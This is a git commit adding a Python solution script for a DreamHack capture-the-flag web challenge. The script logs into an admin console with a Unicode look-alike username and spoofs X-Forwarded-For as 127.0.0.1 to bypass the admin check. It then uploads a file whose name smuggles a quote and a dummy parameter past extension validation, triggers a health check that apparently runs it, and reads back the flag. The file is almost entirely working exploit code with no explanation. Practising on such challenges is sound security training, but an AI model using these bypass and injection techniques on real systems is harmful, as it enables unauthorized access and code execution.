a5d2b5eb1e80db0530dd24b80a0a464c33275127
Echo-H4C <165986950+Echo-H4C@users.noreply.github.com>
2025-03-05 16:25:29 +0900

    Create ex_admin_console.py

---
+++ DreamHack/web_admin console/ex_admin_console.py
@@ -0,0 +1,37 @@
+import requests
+
+URL = "http://host1.dreamhack.games:20299"
+
+login = {"username" : "\u212Aimgildong123","password" : "0p1q9o2w8i3e"}
+
+headers = {"X-Forwarded-For" : "127.0.0.1"}
+
+validate_param = {"path" : "malicious.sh\";dummy=.txt"}
+
+target = {"target" : "malicious"}
+
+session = requests.Session()
+
+# 0. login
+
+session.post(f"{URL}/auth/login",json=login)
+
+# 1. Upload File
+
+with open('./malicious.sh";dummy=.txt','rb') as f:
+    upload = {'file' : f}
+    res = session.post(f"{URL}/admin/upload",headers=headers,files=upload)
+
+# 2. Validate File
+
+validate_req = session.post(f"{URL}/admin/validate",headers=headers,json=validate_param)
+
+# 3. Health Check
+
+healthcheck_req = session.post(f"{URL}/admin/healthcheck",headers=headers,json=target)
+
+# 4. get FLAG
+
+flag = session.get(f"{URL}/uploads/client/test.txt").text
+
+print("FLAG : " + flag)
